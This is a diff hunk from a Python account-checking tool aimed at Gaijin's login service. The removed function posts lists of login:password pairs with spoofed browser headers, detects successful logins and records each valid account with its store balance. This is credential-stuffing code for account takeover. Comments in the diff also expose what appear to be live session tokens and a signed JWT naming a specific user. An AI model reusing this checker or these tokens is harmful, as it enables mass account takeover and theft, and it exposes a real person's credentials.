@@ -413,59 +413,6 @@ def check_valid(login, password):
                 logger.info(f'Valid: {login}')
                 return True #{'identity_sid': 'l53rq3psnoiunn5eqg6roqkm71', 'identity_id': '111856766', 'identity_token': 'ljddfj2wsb44p3bea6k46k786kd9wndhqhfxfpgcsznp1j4xrz3xkwr5gp548yhx', 'slc': '%7B%22ts%22%3A1707885541%2C%22f%22%3A%22830188f4d39fbb0a6ffd924fde4e4717%22%2C%22l%22%3A%5B111856766%5D%2C%22s%22%3A%227cc94abe71998e5d0438499573ff4d3e%22%7D'}
 
-def s_check_valid(login, password):
-    session = requests.Session()
-    while True:
-        if not run_data.active_checking:
-            break
-        headers = {
-            'authority': 'embed.gaijin.net',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'ru-RU,ru;q=0.9',
-            'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://embed.gaijin.net',
-            'referer': 'https://embed.gaijin.net/ru',
-            'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'iframe',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-        }
-        data = {
-                'login': login,
-                'password': password,
-                'action': '',
-                'referer': '',
-                'fingerprint': utils.generate_random_string(len('fa187bf0cc39a5fa2f90580e24409999')),
-                'app_id': '',
-        }
-        response = session.post(
-            'https://embed.gaijin.net/ru/sso/login/procedure/',
-            data=data,
-            headers=headers
-        )
-        with open('base.html', 'w') as f:
-            f.write(response.text)
-        if "uname" in response.text:
-            try:
-                response = session.get('https://store.gaijin.net/')
-                balance = response.text.split('[{"label":"')[1].split('"')[0]
-                run_data.add_valid(f'{login}:{password} - {balance}')
-                logger.info(f'Valid: {login}')
-                return True
-            except:
-                pass
-        else:
-            run_data.add_invalid()
-            logger.info(f'Invalid: {login}')
-            return False
-        
-#<script>(window.opener||window.parent).postMessage({"gjSSO":true,"gsea":true,"action":"login","source":"login","jwt":"eyJhbGciOiJSUzI1NiIsImtpZCI6IjM4MTQ3NiIsInR5cCI6IkpXVCJ9.eyJhdXRoIjoibG9naW4iLCJjbnRyeSI6IlJVIiwiZXhwIjoxNzEwNDc0OTk4LCJmYWMiOiIxM2Y1NTdlYjZkNGYwNWEzZGIyZDkzYzFlMzkzYmY2YjQ0ODllMGNlYThiY2U4NmE5MWIzOTZiODcyMjc1ZmVlIiwiaWF0IjoxNzA3ODgyOTk4LCJpc3MiOiIxIiwia2lkIjoiMzgxNDc2IiwibG5nIjoicnUiLCJsb2MiOiIxNDM5OGNlYjdmMzU1NjFiZTRiOWU2NzhkYTU3ZjUwMWMwNjAzZjc2ZTZiMDk2OWQ1ZDMzZjg2OGZhNmUxMGE0IiwibmljayI6IkVnb3JfMjAwNF9SZXVub3YiLCJzbHQiOiJaTUFXcVJ4RiIsInRncyI6ImRpZmZjdXJyLGxhbmdfYnkscGFydG5lcl95Y3BjLHd0X3ljcGNfYnlfMTQzNzUzOTlfMTIyMDY0MTc1MF80MjIyMTcwMTY3IiwidWlkIjoiODI5MzI2NDgifQ.jMdg6o5RFNkt6N4sfks3eqMec6T-xQjFrYIDvOg-gCKqhnBLTXPVOJZaiT_CDoZO1nuASX3CZHlexqle2uEByzg0QG_l3oWUGBjW39bvVo2EsSI9GnR9qRmhzIZ2lEWTwwZElYcwGXISYcbMGFvyGKSneFCqRb7LL4fA4Wntzqo-z-afjyyLiJ50iaIGtlwite5HLJ-H5uR5GDWtlj9kf0C2qJjUAlv9bgduSjcw85GlbN0XWqsSunjy0na7AQlh0t8DMRFIfgO7iW-snwySsbZlKG7_3BRjd1FyDfaawZ3Z7oF3dX3WEWR0QBRZyGRFzPd5XdEkqUaTG_TaBDgdHQ","status":"ok","secondary":false,"uid":"82932648","uname":"Egor_2004_Reunov"},'*');window.close();</script>
 
 def app_exec():
     app.exec_()
